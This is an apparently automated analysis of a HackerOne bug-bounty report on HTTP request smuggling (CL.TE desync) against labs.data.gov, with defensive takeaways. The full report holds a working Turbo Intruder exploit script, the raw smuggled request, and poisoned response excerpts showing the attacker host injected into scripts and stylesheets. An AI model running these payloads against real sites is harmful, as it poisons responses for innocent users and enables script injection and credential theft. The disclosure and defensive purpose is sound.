# HTTP Request Smuggling on https://labs.data.gov

## Metadata
- **Source:** HackerOne
- **Report:** 726773 | https://hackerone.com/reports/726773
- **Submitted:** 2019-10-31
- **Reporter:** puppykok
- **Program:** Data.gov / GSA (implied)
- **Bounty:** Not specified in writeup
- **Severity:** high
- **Vuln:** HTTP Request Smuggling, CL.TE (Content-Length / Transfer-Encoding desync), Host Header Injection
- **CVEs:** None
- **Category:** uncategorised

## Summary
The application is vulnerable to HTTP request smuggling due to disagreement between front-end and back-end servers on how to parse HTTP request bodies. The front-end uses Transfer-Encoding while the back-end uses Content-Length, allowing attackers to inject malicious requests that get processed by the back-end while appearing benign to the front-end. This leads to Host header injection where attacker-controlled domains are reflected in victim responses across critical areas including scripts, stylesheets, and navigation links.

## Attack scenario
1. Attacker crafts a malicious HTTP request with both Content-Length and Transfer-Encoding: chunked headers, creating a desync between front-end and back-end parsing
2. The crafted request contains a hidden HTTP request smuggled in the chunked encoding that targets a non-existent endpoint with an attacker-controlled Host header
3. Front-end server processes the request based on Transfer-Encoding and forwards to back-end
4. Back-end server ignores Transfer-Encoding and uses Content-Length, causing it to parse the smuggled request as a separate request
5. The smuggled request is processed by back-end, which reflects the attacker's Host header throughout the response (67+ locations identified)
6. Attacker sends follow-up legitimate requests to catch a victim's response poisoned with attacker's domain in scripts, CSS, and links, enabling credential theft or malware distribution

## Root cause
The web application stack has a disagreement in how HTTP request bodies are parsed. The front-end server prioritizes Transfer-Encoding header while the back-end server prioritizes Content-Length header. This CL.TE (Content-Length / Transfer-Encoding) desync creates a window where attackers can inject requests that the back-end processes separately. Additionally, the Host header is not properly validated and is reflected unsanitized in responses.

## Attacker mindset
An attacker would recognize this as a critical cache poisoning and request smuggling opportunity. By timing legitimate user requests after the smuggled request, they could poison cached responses or intercept victim traffic. The extensive reflection of the Host header across scripts and resource URLs makes this ideal for credential harvesting, malware injection, or defacement attacks on a high-traffic government domain.

## Defensive takeaways
- Ensure consistent HTTP parsing between front-end and back-end servers; disable ambiguous headers (disable Transfer-Encoding if using Content-Length or vice versa)
- Implement strict HTTP/2 or HTTP/1.1 compliance; use HTTP/2 when possible as it prevents request smuggling
- Validate and sanitize Host header; never reflect untrusted Host headers in responses without validation
- Implement request smuggling detection and prevention mechanisms at the load balancer/WAF level
- Use normalized request parsing; ensure all intermediaries use identical rules for parsing ambiguous requests
- Regularly audit header handling and request parsing logic across all middleware and servers
- Implement strict cache key construction that includes the normalized Host header to prevent cache poisoning
- Monitor for unusual patterns of requests with conflicting Content-Length and Transfer-Encoding headers

## Variant hunting
Look for CL.TE, TE.CL, and TE.TE desync variants on other endpoints. Test POST, PUT, PATCH methods. Check for similar issues on sister domains or other government sites. Test with various Content-Type headers. Verify if the vulnerability extends to request smuggling that could lead to XSS, credential theft, or remote code execution by smuggling requests to admin panels or sensitive endpoints.

## MITRE ATT&CK
- T1190
- T1040
- T1557
- T1598
- T1187

## Notes
This is a well-documented CL.TE HTTP request smuggling vulnerability with clear proof-of-concept code using Burp's Turbo Intruder. The 67+ instances of Host header reflection indicate significant exposure. The vulnerability affects a high-profile government domain (data.gov) making this a critical finding. The attacker demonstrated pragmatic exploitation by queuing multiple requests to catch victim traffic, reducing the likelihood of self-poisoning. The extensive reflection in JSON-LD, stylesheets, and navigation links creates multiple XSS and credential theft vectors.

## Full report
<details><summary>Expand</summary>

Greetings,

The application appears to be vulnerable to HTTP request smuggling due to a disagreement between the front-end and back-end server, where the front-end server uses the Transfer-Encoding header to determine content in the HTTP body, but back-end server uses the Content-Length header, which causes a desync. The following steps outline how to reproduce this vulnerability:

The purpose of the following Turbo Intruder script is to send a desync request followed by 14 requests in quick succession to increase the chances of catching the desync-ed request such that it would not poison the request of another user who happens to be browsing the page.
```
import re

def queueRequests(target, wordlists):

    # to use Burp's HTTP stack for upstream proxy rules etc, use engine=Engine.BURP
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1,
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                           )
    engine.start()

    prefix = '''POST /hopefully404 HTTP/1.1
Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1'''

    chunk_size = hex(len(prefix)).lstrip("0x")
    attack = target.req.replace('0\r\n\r\n', chunk_size+'\r\n'+prefix+'\r\n0\r\n\r\n')
    content_length = re.search('Content-Length: ([\d]+)', attack).group(1)
    attack = attack.replace('Content-Length: '+content_length, 'Content-length: '+str(int(content_length)+len(chunk_size)-3))
    engine.queue(attack)

    for i in range(14):
        engine.queue(target.req)
        time.sleep(0.05)


def handleResponse(req, interesting):
    table.add(req)
```
The following desync request issued to the server is shown below, where I changed the host header to my Burp's collaborator domain:
```
POST / HTTP/1.1
Host: labs.data.gov
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding : chunked

a2
POST /hopefully404 HTTP/1.1
Host: o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```
From the following screenshot, you can see that a 'victim' request was caught which redirected to a 404 page, just as intended, since `https://www.data.gov/hopefully404` does not actually exist. In addition, by searching for my Burp's collaborator URL, you can see that there are 67 instances where the URL is reflected, some within script tags and sources:
{F622456}

The following request is heavily shortened to show that the attacker's host URL is reflected in multiple critical areas within the victim's response:
``` 
-snip
<script type='application/ld+json' class='yoast-schema-graph yoast-schema-graph--main'>{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/#website","url":"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/","name":"Data.gov","potentialAction":{"@type":"SearchAction","target":"https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/?s={search_term_string}","query-input":"required name=search_term_string"}}]}</script>
<!-- / Yoast SEO plugin. -->

-snip-

<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/simple-tooltips/zebra_tooltips.css?ver=5.2.4">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/reset.min.css?ver=4.9.16">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/common.min.css?ver=4.9.16">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/app/plugins/the-events-calendar/common/src/resources/css/tooltip.min.css?ver=4.9.16">
<link rel="stylesheet" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/wp/wp-includes/css/dist/block-library/style.min.css?ver=5.2.4">

-snip-

<a class="dropdown-toggle local-link" data-toggle="dropdown" data-target="#" href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/communities/">Topics <b class="caret"></b></a>
<ul class="dropdown-menu topics">
	<li class="menu-agriculture topic-food"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/food/" class="local-link"><i></i><span>Agriculture</span></a></li>
	<li class="menu-climate topic-climate"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/climate/" class="local-link"><i></i><span>Climate</span></a></li>
	<li class="menu-consumer topic-consumer"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/consumer/" class="local-link"><i></i><span>Consumer</span></a></li>
	<li class="menu-ecosystems topic-ecosystems"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/ecosystems/" class="local-link"><i></i><span>Ecosystems</span></a></li>
	<li class="menu-education topic-education"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/education/" class="local-link"><i></i><span>Education</span></a></li>
	<li class="menu-energy topic-energy"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/energy/" class="local-link"><i></i><span>Energy</span></a></li>
	<li class="menu-finance topic-finance"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/finance/" class="local-link"><i></i><span>Finance</span></a></li>
	<li class="menu-health topic-health"><a href="https://o0p31lhhe946t0sns65oy4vsejkb80.burpcollaborator.net/health/" class="local-link"><i></i><span>Health</span></a></li>
```
Note that this attack is not reliable and we may fail to 'catch on' to the victim's request which might inadvertently affect an innocent user. During testing, there was one such case of this happening and the Burp Collaborator manages to posion someone from Los Angeles, California:
{F622459}
{F622460}
In order to prevent affecting more innocent users, I stopped further testing after coming with the above proof of concept which should be sufficent to proof the existence of the vulnerability. Please let me know if any additional information is needed and I will gladly provide.

## Impact

Since the javascript imports on the page can be determined by the attacker, he can host a malicious domain to steal user data, perform stored cross-site scripting and defacing the webpage for the user whos request was poisoned by the desynced request. In addition, I noticed there was a Wordpress login page but seems like it requires a specially-configured browser to access the SSO. My suspicion is that it is very likely that an attacker can steal authenticated cookies/headers which will be sent to an attacker-controlled server, although I am unable to verify (Can't get SSO to work on my browser).

</details>

---
*Analysed by Claude on 2026-05-24*
